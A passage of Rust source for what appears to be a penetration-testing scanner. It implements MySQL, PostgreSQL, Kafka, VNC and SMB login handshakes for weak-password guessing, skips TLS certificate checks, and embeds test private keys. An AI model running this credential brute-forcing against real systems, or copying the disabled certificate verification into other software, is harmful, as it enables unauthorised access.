                    .get(index + 1..index + 3)
                    .map(|value| u16::from_le_bytes([value[0], value[1]]) as usize)
                {
                    index += 3 + length;
                    login_ack = true;
                } else {
                    break;
                }
            }
            0xAA => return false,
            0xAB | 0xE3 => {
                if let Some(length) = payload
                    .get(index + 1..index + 3)
                    .map(|value| u16::from_le_bytes([value[0], value[1]]) as usize)
                {
                    index += 3 + length;
                } else {
                    break;
                }
            }
            0xFD | 0xFE | 0xFF => {
                if payload.len().saturating_sub(index) < 13 {
                    break;
                }
                index += 13;
            }
            _ => break,
        }
    }
    login_ack
}

fn utf16le_bytes(value: &str) -> Vec<u8> {
    value
        .encode_utf16()
        .flat_map(|unit| unit.to_le_bytes())
        .collect()
}

fn mysql_handshake_response(username: &str, password: &str, scramble: &[u8]) -> Vec<u8> {
    const CLIENT_LONG_PASSWORD: u32 = 0x0000_0001;
    const CLIENT_LONG_FLAG: u32 = 0x0000_0004;
    const CLIENT_PROTOCOL_41: u32 = 0x0000_0200;
    const CLIENT_TRANSACTIONS: u32 = 0x0000_2000;
    const CLIENT_SECURE_CONNECTION: u32 = 0x0000_8000;
    const CLIENT_PLUGIN_AUTH: u32 = 0x0008_0000;

    let capabilities = CLIENT_LONG_PASSWORD
        | CLIENT_LONG_FLAG
        | CLIENT_PROTOCOL_41
        | CLIENT_TRANSACTIONS
        | CLIENT_SECURE_CONNECTION
        | CLIENT_PLUGIN_AUTH;

    let auth_response = mysql_native_password(password, scramble);

    let mut payload = Vec::new();
    payload.extend_from_slice(&capabilities.to_le_bytes());
    payload.extend_from_slice(&0x0100_0000u32.to_le_bytes());
    payload.push(0x21);
    payload.extend_from_slice(&[0u8; 23]);
    payload.extend_from_slice(username.as_bytes());
    payload.push(0x00);
    payload.push(auth_response.len() as u8);
    payload.extend_from_slice(&auth_response);
    payload.extend_from_slice(b"mysql_native_password\0");
    payload
}

fn mysql_native_password(password: &str, scramble: &[u8]) -> Vec<u8> {
    if password.is_empty() {
        return Vec::new();
    }

    let stage1 = Sha1::digest(password.as_bytes());
    let stage2 = Sha1::digest(stage1);
    let mut combined = Vec::with_capacity(scramble.len() + stage2.len());
    combined.extend_from_slice(scramble);
    combined.extend_from_slice(&stage2);
    let stage3 = Sha1::digest(&combined);
    stage1
        .iter()
        .zip(stage3.iter())
        .map(|(left, right)| left ^ right)
        .collect()
}

fn mysql_extract_scramble(handshake: &[u8]) -> Result<Vec<u8>> {
    if handshake.len() < 34 {
        anyhow::bail!("mysql handshake too short");
    }

    let first_nul = handshake
        .iter()
        .position(|byte| *byte == 0x00)
        .context("invalid mysql handshake version")?;
    let mut index = first_nul + 1 + 4;
    let mut scramble = handshake
        .get(index..index + 8)
        .context("missing mysql scramble part one")?
        .to_vec();
    index += 8 + 1;
    index += 2 + 1 + 2 + 2;
    let auth_plugin_len = *handshake
        .get(index)
        .context("missing mysql auth plugin length")? as usize;
    index += 1 + 10;
    let second_len = auth_plugin_len.saturating_sub(8).max(13);
    let second = handshake
        .get(index..index + second_len)
        .context("missing mysql scramble part two")?;
    scramble.extend_from_slice(second);
    if let Some(position) = scramble.iter().position(|byte| *byte == 0x00) {
        scramble.truncate(position);
    }
    Ok(scramble)
}

fn mysql_read_packet(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream
        .read_exact(&mut header)
        .context("failed to read mysql packet header")?;
    let length = (header[0] as usize) | ((header[1] as usize) << 8) | ((header[2] as usize) << 16);
    let mut payload = vec![0u8; length];
    stream
        .read_exact(&mut payload)
        .context("failed to read mysql packet payload")?;
    Ok(payload)
}

fn mysql_write_packet(stream: &mut TcpStream, sequence: u8, payload: &[u8]) -> Result<()> {
    let length = payload.len();
    let mut packet = Vec::with_capacity(length + 4);
    packet.push((length & 0xff) as u8);
    packet.push(((length >> 8) & 0xff) as u8);
    packet.push(((length >> 16) & 0xff) as u8);
    packet.push(sequence);
    packet.extend_from_slice(payload);
    write_and_flush(stream, &packet)
}

fn postgres_startup_message(username: &str, database: &str) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&196_608u32.to_be_bytes());
    payload.extend_from_slice(b"user\0");
    payload.extend_from_slice(username.as_bytes());
    payload.push(0x00);
    payload.extend_from_slice(b"database\0");
    payload.extend_from_slice(database.as_bytes());
    payload.push(0x00);
    payload.extend_from_slice(b"client_encoding\0UTF8\0");
    payload.push(0x00);

    let mut message = Vec::with_capacity(payload.len() + 4);
    message.extend_from_slice(&((payload.len() + 4) as u32).to_be_bytes());
    message.extend_from_slice(&payload);
    message
}

fn postgres_password_message(password: &str) -> Vec<u8> {
    let mut payload = Vec::with_capacity(password.len() + 6);
    payload.push(b'p');
    payload.extend_from_slice(&((password.len() + 5) as u32).to_be_bytes());
    payload.extend_from_slice(password.as_bytes());
    payload.push(0x00);
    payload
}

fn postgres_md5_password(username: &str, password: &str, salt: &[u8]) -> String {
    let first = format!("{:x}", md5::compute(format!("{password}{username}")));
    let mut second = first.into_bytes();
    second.extend_from_slice(salt);
    format!("md5{:x}", md5::compute(second))
}

fn postgres_read_message(stream: &mut TcpStream) -> Result<(u8, Vec<u8>)> {
    let mut tag = [0u8; 1];
    stream
        .read_exact(&mut tag)
        .context("failed to read postgres message tag")?;
    let mut length = [0u8; 4];
    stream
        .read_exact(&mut length)
        .context("failed to read postgres message length")?;
    let size = u32::from_be_bytes(length) as usize;
    if size < 4 {
        anyhow::bail!("invalid postgres message length");
    }
    let mut payload = vec![0u8; size - 4];
    stream
        .read_exact(&mut payload)
        .context("failed to read postgres message payload")?;
    Ok((tag[0], payload))
}

fn postgres_auth_code(payload: &[u8]) -> Result<u32> {
    let bytes: [u8; 4] = payload
        .get(0..4)
        .context("missing postgres auth code")?
        .try_into()
        .context("invalid postgres auth code")?;
    Ok(u32::from_be_bytes(bytes))
}

fn kafka_api_versions_request(correlation_id: i32) -> Vec<u8> {
    kafka_request(18, 0, correlation_id, "rscan", &[])
}

fn kafka_sasl_handshake_request(correlation_id: i32, mechanism: &str) -> Vec<u8> {
    kafka_request(17, 1, correlation_id, "rscan", &kafka_string(mechanism))
}

fn kafka_sasl_plain_auth_frame(username: &str, password: &str) -> Vec<u8> {
    let payload = format!("\u{0}{username}\u{0}{password}").into_bytes();
    let mut frame = Vec::with_capacity(payload.len() + 4);
    frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    frame.extend_from_slice(&payload);
    frame
}

fn kafka_request(
    api_key: i16,
    api_version: i16,
    correlation_id: i32,
    client_id: &str,
    body: &[u8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&api_key.to_be_bytes());
    payload.extend_from_slice(&api_version.to_be_bytes());
    payload.extend_from_slice(&correlation_id.to_be_bytes());
    payload.extend_from_slice(&kafka_string(client_id));
    payload.extend_from_slice(body);

    let mut frame = Vec::with_capacity(payload.len() + 4);
    frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    frame.extend_from_slice(&payload);
    frame
}

fn kafka_string(value: &str) -> Vec<u8> {
    let bytes = value.as_bytes();
    let mut encoded = Vec::with_capacity(bytes.len() + 2);
    encoded.extend_from_slice(&(bytes.len() as i16).to_be_bytes());
    encoded.extend_from_slice(bytes);
    encoded
}

fn kafka_read_frame(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut header = [0u8; 4];
    stream
        .read_exact(&mut header)
        .context("failed to read kafka frame header")?;
    let length = u32::from_be_bytes(header) as usize;
    let mut payload = vec![0u8; length];
    stream
        .read_exact(&mut payload)
        .context("failed to read kafka frame payload")?;
    Ok(payload)
}

fn kafka_response_correlation(payload: &[u8]) -> Option<i32> {
    let bytes: [u8; 4] = payload.get(0..4)?.try_into().ok()?;
    Some(i32::from_be_bytes(bytes))
}

fn kafka_sasl_handshake_error(payload: &[u8]) -> Option<i16> {
    let bytes: [u8; 2] = payload.get(4..6)?.try_into().ok()?;
    Some(i16::from_be_bytes(bytes))
}

fn vnc_encrypt_challenge(password: &str, challenge: &[u8; 16]) -> Result<[u8; 16]> {
    let key = vnc_key_from_password(password);
    let cipher = Des::new_from_slice(&key).context("failed to initialize vnc des cipher")?;
    let mut encrypted = [0u8; 16];

    for (index, block) in challenge.chunks_exact(8).enumerate() {
        let mut value = GenericArray::clone_from_slice(block);
        cipher.encrypt_block(&mut value);
        encrypted[index * 8..(index + 1) * 8].copy_from_slice(&value);
    }

    Ok(encrypted)
}

fn vnc_key_from_password(password: &str) -> [u8; 8] {
    let mut key = [0u8; 8];
    for (index, byte) in password.as_bytes().iter().take(8).enumerate() {
        key[index] = byte.reverse_bits();
    }
    key
}

fn parse_ber_length(bytes: &[u8]) -> Option<(usize, usize)> {
    let first = *bytes.first()?;
    if first & 0x80 == 0 {
        Some((first as usize, 1))
    } else {
        let count = (first & 0x7f) as usize;
        if count == 0 || bytes.len() < 1 + count {
            return None;
        }
        let mut length = 0usize;
        for byte in &bytes[1..=count] {
            length = (length << 8) | (*byte as usize);
        }
        Some((length, 1 + count))
    }
}

fn connect_stream(target: &OpenService, timeout: Duration) -> Result<TcpStream> {
    let address = format!("{}:{}", target.host, target.port);
    let socket = address
        .to_socket_addrs()
        .with_context(|| format!("failed to resolve {address}"))?
        .next()
        .with_context(|| format!("no socket addresses for {address}"))?;
    connect_stream_with(&socket, timeout, &address, TcpStream::connect_timeout)
}

fn connect_stream_with<F>(
    socket: &std::net::SocketAddr,
    timeout: Duration,
    address: &str,
    mut connect: F,
) -> Result<TcpStream>
where
    F: FnMut(&std::net::SocketAddr, Duration) -> std::io::Result<TcpStream>,
{
    let max_retries = usize::from(current_connection_runtime_options().max_retries);
    let mut last_error = None;

    for attempt in 0..=max_retries {
        match connect(socket, timeout) {
            Ok(stream) => return configure_stream(stream, timeout, address),
            Err(error) => {
                last_error = Some(error);
                if attempt == max_retries {
                    break;
                }
            }
        }
    }

    let error =
        anyhow::Error::from(last_error.expect("connect_stream_with should record an error"));
    Err(error).with_context(|| format!("failed to connect to {address}"))
}

fn configure_stream(stream: TcpStream, timeout: Duration, address: &str) -> Result<TcpStream> {
    stream
        .set_read_timeout(Some(timeout))
        .with_context(|| format!("failed to set read timeout for {address}"))?;
    stream
        .set_write_timeout(Some(timeout))
        .with_context(|| format!("failed to set write timeout for {address}"))?;
    Ok(stream)
}

fn tls_client_config() -> Arc<ClientConfig> {
    static CONFIG: OnceLock<Arc<ClientConfig>> = OnceLock::new();
    Arc::clone(CONFIG.get_or_init(|| {
        Arc::new(
            ClientConfig::builder_with_provider(
                rustls::crypto::aws_lc_rs::default_provider().into(),
            )
            .with_safe_default_protocol_versions()
            .expect("TLS protocol versions should be available")
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(NoCertificateVerification))
            .with_no_client_auth(),
        )
    }))
}

fn tls_server_name(host: &str) -> Result<ServerName<'static>> {
    ServerName::try_from(host.to_string()).context("invalid TLS server name")
}

fn connect_tls_stream(target: &OpenService, timeout: Duration) -> Result<ClientTlsStream> {
    let address = format!("{}:{}", target.host, target.port);
    let stream = connect_stream(target, timeout)?;
    let connection = ClientConnection::new(tls_client_config(), tls_server_name(&target.host)?)
        .with_context(|| format!("failed to create TLS client for {address}"))?;
    let mut tls = StreamOwned::new(connection, stream);
    tls.conn
        .complete_io(&mut tls.sock)
        .with_context(|| format!("failed to complete TLS handshake for {address}"))?;
    Ok(tls)
}

fn write_and_flush_io<S>(stream: &mut S, payload: &[u8]) -> Result<()>
where
    S: Write,
{
    stream.write_all(payload).context("failed to write request")?;
    stream.flush().context("failed to flush request")
}

fn write_and_flush(stream: &mut TcpStream, payload: &[u8]) -> Result<()> {
    write_and_flush_io(stream, payload)
}

fn send_tcp_command(target: &OpenService, command: &[u8], timeout_secs: u64) -> Result<String> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    write_and_flush(&mut stream, command)?;
    read_available(&mut stream)
}

fn send_tcp_payload(target: &OpenService, payload: &[u8], timeout_secs: u64) -> Result<String> {
    send_tcp_command(target, payload, timeout_secs)
}

fn read_line_io<S>(stream: &mut S) -> Result<String>
where
    S: Read,
{
    let mut buffer = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        match stream.read(&mut byte) {
            Ok(0) => break,
            Ok(_) => {
                buffer.push(byte[0]);
                if byte[0] == b'\n' {
                    break;
                }
            }
            Err(error)
                if matches!(
                    error.kind(),
                    ErrorKind::WouldBlock | ErrorKind::TimedOut | ErrorKind::Interrupted
                ) =>
            {
                if error.kind() == ErrorKind::Interrupted {
                    continue;
                }
                break;
            }
            Err(error) => return Err(error).context("failed to read line"),
        }
    }
    Ok(String::from_utf8_lossy(&buffer).to_string())
}

fn read_line(stream: &mut TcpStream) -> Result<String> {
    read_line_io(stream)
}

fn read_available_io<S>(stream: &mut S) -> Result<String>
where
    S: Read,
{
    Ok(String::from_utf8_lossy(&read_available_bytes_io(stream)?).to_string())
}

fn read_available(stream: &mut TcpStream) -> Result<String> {
    read_available_io(stream)
}

fn read_available_bytes_io<S>(stream: &mut S) -> Result<Vec<u8>>
where
    S: Read,
{
    let mut buffer = Vec::new();
    let mut chunk = [0u8; 1024];

    loop {
        match stream.read(&mut chunk) {
            Ok(0) => break,
            Ok(count) => {
                buffer.extend_from_slice(&chunk[..count]);
                if count < chunk.len() {
                    break;
                }
            }
            Err(error)
                if matches!(
                    error.kind(),
                    ErrorKind::WouldBlock | ErrorKind::TimedOut | ErrorKind::Interrupted
                ) =>
            {
                if buffer.is_empty() && error.kind() == ErrorKind::Interrupted {
                    continue;
                }
                break;
            }
            Err(error) => return Err(error).context("failed to read response"),
        }
    }

    Ok(buffer)
}

fn read_available_bytes(stream: &mut TcpStream) -> Result<Vec<u8>> {
    read_available_bytes_io(stream)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::io::{BufReader, ErrorKind};
    use std::net::{TcpListener, UdpSocket};
    use std::path::PathBuf;
    use std::sync::{Arc, Mutex};
    use std::thread;
    use rustls::pki_types::PrivateKeyDer;
    use rustls::{ServerConfig, ServerConnection};

    const TEST_SSH_PRIVATE_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n\
NhAAAAAwEAAQAAAQEApsV6z4Qb/kgByFhg/Ive9nyAL01i3FOhIeA9VCR+CofpDm3cV/3j\n\
nbKhDDHyD5/E4jsJ8YTXbvHCaCMUZ02/sFYEmqFiKhURZLz8W5gTi3q/EWFN6RF0Cxch/n\n\
4ayR/f0+wun8L4ZMvEfSLgNa8wqHu/pC0zMuWtam+fg95G6X2miTSa0e+HJUX216k77VuG\n\
/+GfqQg5oxva17qRoRbrxuzW1dCURULEiegDYGviCl4/3MhIxCxisi8wfKrNZcjWiEB1lc\n\
H7s8wlI0Qpafa9aGO7oEIe1kiN/LChhYSSDUcH69/+Kp5rbA6b5i9uJS4gJx/2J3yqiFzh\n\
B2Lnlvyw5QAAA9iRPt3bkT7d2wAAAAdzc2gtcnNhAAABAQCmxXrPhBv+SAHIWGD8i972fI\n\
AvTWLcU6Eh4D1UJH4Kh+kObdxX/eOdsqEMMfIPn8TiOwnxhNdu8cJoIxRnTb+wVgSaoWIq\n\
FRFkvPxbmBOLer8RYU3pEXQLFyH+fhrJH9/T7C6fwvhky8R9IuA1rzCoe7+kLTMy5a1qb5\n\
+D3kbpfaaJNJrR74clRfbXqTvtW4b/4Z+pCDmjG9rXupGhFuvG7NbV0JRFQsSJ6ANga+IK\n\
Xj/cyEjELGKyLzB8qs1lyNaIQHWVwfuzzCUjRClp9r1oY7ugQh7WSI38sKGFhJINRwfr3/\n\
4qnmtsDpvmL24lLiAnH/YnfKqIXOEHYueW/LDlAAAAAwEAAQAAAP9gACvLnnyg7H0rRfkX\n\
I49PVI8gRUE0k5pHiAmjoeaoGC4qKL5QtYlI8U9MRut/vaOP7J+iClZfwtyVJs+ghcMwpU\n\
J4r9RBQyO3jPCE/JcQd9P8rUJ48IqPk4WxRtVGnHB4DdsvYJ3PiknNWLUeurHqBqe50eTA\n\
tJg4tW83YCvHPA44lcA5BlnfWaw7uLOUyASQKh7kiOWSx/yHvaCwHFzxih2GIr3rmPWNq1\n\
ASAYVVqaxQD0dMCJVGpyY0D2/KgiQ2RE6/vk5LR9wMRjMR1vZN1kmQaObyHLeN/h1F2GMS\n\
Kslm81jplV88LUcWMWYs4NrrrAHUny2OcsOgWq1NeZMAAACBAL7PzjYTTn//2XYid5TBKZ\n\
kqcUNiH8UUOLVzyAKaCD39OIs+elOoAVOT9FYSdzqMFap8kAqmv+eBYZyEoX3Z40NcuzmC\n\
xpI9d5kDWundiOM4108Wb4rraj49TyJrvln22+2ep09Ms5LL0DFR3qmiYeGYjjNmSRRuMZ\n\
OS9HmUsf/gAAAAgQDZGY+MZmFwwOHiSanlVeKaPB9CrDrJI0picTPuziXeZusEH4mmSx1+\n\
EVCFnjCDMnMdaTb9KG8ENr8TwvHdorf1BeyCKmZ+aQrpCIKu43sPd8ipm1v8upvZEKdnVv\n\
wlUV2NAaJHXQ5JFcoClASYORU5uETWHrS78L/8Eys/JoRLlwAAAIEAxKdWWo1p//zLtdmS\n\
784MleMd4cf0T/E8QodPpBskCUkDobrDT9sZCPHpi0w++dgBPbWjfi1Z3Th+mkhTtMhuSK\n\
lIruPFIShEPVQjqWkOlpX8MVgOYNbM2d2K/URu9U4HfaHLYXTqB8i4VGs7xMeKSLNPo/8e\n\
T+lFmFTFlBLc5uMAAAAccm9vdEBpWjBqbDdlMTBycndsczk4dXhoZjdoWgECAwQFBgc=\n\
-----END OPENSSH PRIVATE KEY-----\n";
    const TEST_TLS_CERT: &str = "-----BEGIN CERTIFICATE-----\n\
MIIDJTCCAg2gAwIBAgIUVsKefIIAEdhsupG7MpdeI4oOp+AwDQYJKoZIhvcNAQEL\n\
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTI2MDQyNDAxMTA0NloXDTI2MDQy\n\
NTAxMTA0NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF\n\
AAOCAQ8AMIIBCgKCAQEA1b3LZDyq0OWkJIehkB15JDPenaRtJ85zNicdBQvGI5O4\n\
KNlYW/l/84rjp2EFMlB8zenT1HEqSe1K+P0UZqZ6+8QEY7EaHa+jw04ouuIF6cje\n\
OC2uPHYdPatjF5ayLZTL9Eyv2KMFJhYegxIdX3tkfCEHyN8ntIK6BhG1vBfh1e+P\n\
X2YRY+asTvxFeiiHggyCHPzO4qnd4aJWbTPbTsad8jDBaUBgOHbI7j3gBo0UZkwO\n\
QGcHsovCceGKcqfPDkFjfvBTXDMpA5NTAdYsThL2Lt5ylOQ/45IB4IvDmyZRBzrv\n\
GzF0xNUxKHptzdkJ5CtQbFW19Raon1Rx0nnYUGvQaQIDAQABo28wbTAdBgNVHQ4E\n\
FgQUBeJnXanldzZuzrp3p6PbDzxed64wHwYDVR0jBBgwFoAUBeJnXanldzZuzrp3\n\
p6PbDzxed64wDwYDVR0TAQH/BAUwAwEB/zAaBgNVHREEEzARgglsb2NhbGhvc3SH\n\
BH8AAAEwDQYJKoZIhvcNAQELBQADggEBADmYSfEQS/DIvwtKofg6VKGTe3UcVx1f\n\
f1XIQywqou5/dFG9cK/ChCWcIlIukmUHrhwbXQ0k/AzdFwjj1D2gBh8qxNXf/GQx\n\
cqx51ZiY+akmLd/lPkPFHCDL4tGl17boglGvW3T/u3FFfXXV8dQaJ9wNgetw7vUL\n\
VANxm+zndHkgzHgFAPuuIyq5iNWwnnWuB6CtR2FB2d+t40aa2D90Yysy8dMNCZfR\n\
BclVky6ChHmANe0JgMk7OApo2Pz7EBluXYFVrQMiGSwJbLlL8F7VyYXjLed76WU0\n\
a5J2UBJo0i+WVREmrnWhIuvCJIpBaqeaPG8KDsC8RHvBFbGUErV6gX0=\n\
-----END CERTIFICATE-----\n";
    const TEST_TLS_KEY: &str = "-----BEGIN PRIVATE KEY-----\n\
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDVvctkPKrQ5aQk\n\
h6GQHXkkM96dpG0nznM2Jx0FC8Yjk7go2Vhb+X/ziuOnYQUyUHzN6dPUcSpJ7Ur4\n\
/RRmpnr7xARjsRodr6PDTii64gXpyN44La48dh09q2MXlrItlMv0TK/YowUmFh6D\n\
Eh1fe2R8IQfI3ye0groGEbW8F+HV749fZhFj5qxO/EV6KIeCDIIc/M7iqd3holZt\n\
M9tOxp3yMMFpQGA4dsjuPeAGjRRmTA5AZweyi8Jx4Ypyp88OQWN+8FNcMykDk1MB\n\
1ixOEvYu3nKU5D/jkgHgi8ObJlEHOu8bMXTE1TEoem3N2QnkK1BsVbX1FqifVHHS\n\
edhQa9BpAgMBAAECggEAARQhBtCm1XsKd2EXHaIocW+ZkxbPspIXmO6LasOluCWy\n\
gpUsBkCdtq9IkKQ3ylBNTgYrg0/Zy7D7xvb7oEhCy1lfKKmiItVOcJ+DFAQstgKW\n\
w8UVyl/0w0Zc3jM+HvI4YC2ZcHxvNgkVcw/hnPmO+1lhgTi6taghDDIQ3aB/C3GD\n\
IyprnMxIE/sc1LyVdZhGTF9X6I3xp+jQP7VJpX91wjffUac8G0+pzR1B2Rw6ZF7V\n\
Yu4EhU5dptp0tCbLlpzKvnD2/X01jwk8WffpgeN/oM2fYggl4UNkgl0aLYEwJFZo\n\
/XYuXl5QszOTmb2ZX9u17U1h9BlctkAvvH9/bqu3IQKBgQDxv53WbiRxyPZpvB5A\n\
UAeE52pDyyQLVI1xdktrSdPpp+BKDwg4CQqh3kffpAOa2s57IH+0tO5mnfG7w5SK\n\
CLhGqutAMkMey58bMMnPOW4lZvGgEqoH97p59mjLya+mb3P1k1fg3h2ep6uIo+yr\n\
P1nencHSyBQKMuTcA1ciBD7IXQKBgQDiV4EebrvHwr5wehhXPegUfjA7g5T/+1Za\n\
65XnCZSQXrmsWuqn+UazMndwIHj4utCEG7h2RqypRkW31ippOiiApB0EmRsjgIWm\n\
oSJxXDQtkwZu2mkC5aZO9tJ4Q2NgprCyIr0jux9QBv9kNu16FdWNK5N6clw0C3oC\n\
fa3QWBg3fQKBgQDcnaHNLnbT4DIADE0PI/m4r/eqJpiePmtWQD5Tiux5L1rgOxel\n\
C5tIXTH6RhOEHmqQsvfYUcW+oCUa1UGZNpv04cYOr8/RKsHobn29Pwvl1ixriJzi\n\
6JCk/NpmH4jMuql4Ux6/d/RP9XP1HqO9I/M/1Xgsg6rGI+v3XJUH1hf1gQKBgGps\n\
mJKVoIex4teCITXMLvaLyuQA36tpI1aG1SoYEBm94HHRIeqvQ/X4Mb6wFhFlzauA\n\
WUCLxJ2nJBrngXOO3AJ4qAhEcUVFJhKOS2Kf5wzSx8CRw7SQBJ22YooXrX+BgS2R\n\
Nfu5/WQklispxImWAJ5rMeHuKbpy9wB61aJT+bcFAoGAOXuAvfFH34syYitB/XG6\n\
xHJFz2k4twxhE3RZVYnWkzZ6duRrUEKfYYMn+nG+7vsZ4xJLzqO4Ua7NiBw32+Do\n\
t4jVJls3AqAt63f2EkL2jUjSpIyEB8jnLUTsdWE8UiBXGIV9YqvYiE3ekZylgV2d\n\
zSzfRta6NR6ILTdj7W2rfKU=\n\
-----END PRIVATE KEY-----\n";

    fn tls_test_config() -> Arc<ServerConfig> {
        static CONFIG: OnceLock<Arc<ServerConfig>> = OnceLock::new();
        Arc::clone(CONFIG.get_or_init(|| {
            let mut cert_reader = BufReader::new(TEST_TLS_CERT.as_bytes());
            let certs = rustls_pemfile::certs(&mut cert_reader)
                .collect::<std::result::Result<Vec<_>, _>>()
                .expect("TLS cert should parse");
            let mut key_reader = BufReader::new(TEST_TLS_KEY.as_bytes());
            let key: PrivateKeyDer<'static> = rustls_pemfile::private_key(&mut key_reader)
                .expect("TLS key should parse")
                .expect("TLS key should exist");
            Arc::new(
                ServerConfig::builder_with_provider(
                    rustls::crypto::aws_lc_rs::default_provider().into(),
                )
                .with_safe_default_protocol_versions()
                .expect("TLS protocol versions should be available")
                .with_no_client_auth()
                .with_single_cert(certs, key)
                .expect("TLS server config should build"),
            )
        }))
    }

    struct TestSshHandler {
        username: String,
        password: Option<String>,
        authorized_key: Option<russh::keys::PublicKey>,
    }

    impl russh::server::Handler for TestSshHandler {
        type Error = russh::Error;

        fn auth_password(
            &mut self,
            user: &str,
            password: &str,
        ) -> impl std::future::Future<
            Output = std::result::Result<russh::server::Auth, Self::Error>,
        > + Send {
            let accepted = self.username == user
                && self
                    .password
                    .as_deref()
                    .is_some_and(|expected| expected == password);
            async move {
                Ok(if accepted {
                    russh::server::Auth::Accept
                } else {
                    russh::server::Auth::reject()
                })
            }
        }

        fn auth_publickey_offered(
            &mut self,
            user: &str,
            _public_key: &russh::keys::PublicKey,
        ) -> impl std::future::Future<
            Output = std::result::Result<russh::server::Auth, Self::Error>,
        > + Send {
            let accepted = self.username == user && self.authorized_key.is_some();
            async move {
                Ok(if accepted {
                    russh::server::Auth::Accept
                } else {
                    russh::server::Auth::reject()
                })
            }
        }

        fn auth_publickey(
            &mut self,
            user: &str,
            _public_key: &russh::keys::PublicKey,
        ) -> impl std::future::Future<
            Output = std::result::Result<russh::server::Auth, Self::Error>,
        > + Send {
            let accepted = self.username == user && self.authorized_key.is_some();
            async move {
                Ok(if accepted {
                    russh::server::Auth::Accept
                } else {
                    russh::server::Auth::reject()
                })
            }
        }

        fn channel_open_session(
            &mut self,
            _channel: russh::Channel<russh::server::Msg>,
            _session: &mut russh::server::Session,
        ) -> impl std::future::Future<Output = std::result::Result<bool, Self::Error>> + Send
        {
            async { Ok(true) }
        }
    }

    #[test]
    fn detects_ftp_anonymous_login() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            stream
                .write_all(b"220 FTP ready\r\n")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];
            let count = stream.read(&mut buffer).expect("user should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER anonymous"));
            stream
                .write_all(b"230 Login successful\r\n")
                .expect("login should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ftp",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ftp");
        assert_eq!(findings[0].status, "anonymous-login");
        assert_eq!(findings[0].details["username"], json!("anonymous"));
    }

    #[test]
    fn skips_ms17010_when_brute_force_disabled() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        drop(listener);

        set_auth_runtime_options(AuthRuntimeOptions {
            disable_brute: true,
            ..AuthRuntimeOptions::default()
        });
        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ms17010",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 1,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");
        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert!(findings.is_empty());
    }

    #[test]
    fn keeps_redis_unauthorized_when_brute_force_disabled() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 128];
            let count = stream.read(&mut buffer).expect("request should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("INFO"));
            stream
                .write_all(b"$12\r\nredis_version\r\n")
                .expect("response should write");
        });

        set_auth_runtime_options(AuthRuntimeOptions {
            disable_brute: true,
            ..AuthRuntimeOptions::default()
        });
        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "redis",
            &PluginContext {
                usernames: Vec::new(),
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");
        set_auth_runtime_options(AuthRuntimeOptions::default());

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "redis");
        assert_eq!(findings[0].status, "unauthorized");
    }

    #[test]
    fn detects_smb_weak_password_with_domain_runtime_options() {
        set_auth_runtime_options(AuthRuntimeOptions {
            domain: Some("CORP".to_string()),
            hashes: Vec::new(),
            disable_brute: false,
            ..AuthRuntimeOptions::default()
        });

        let mut attempts = Vec::new();
        let finding = scan_smb_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 445,
            },
            &PluginContext {
                usernames: vec!["administrator".to_string()],
                passwords: vec!["{user}@123".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, domain, _| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    domain.to_string(),
                ));
                Ok(username == "administrator"
                    && password == "administrator@123"
                    && domain == "CORP")
            },
        )
        .expect("scan should succeed")
        .expect("smb finding should exist");

        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert_eq!(
            attempts,
            vec![(
                "administrator".to_string(),
                "administrator@123".to_string(),
                "CORP".to_string()
            )]
        );
        assert_eq!(finding.plugin, "smb");
        assert_eq!(finding.status, "weak-password");
        assert_eq!(finding.details["service"], json!("smb"));
        assert_eq!(finding.details["username"], json!("administrator"));
        assert_eq!(finding.details["password"], json!("administrator@123"));
        assert_eq!(finding.details["domain"], json!("CORP"));
    }

    #[test]
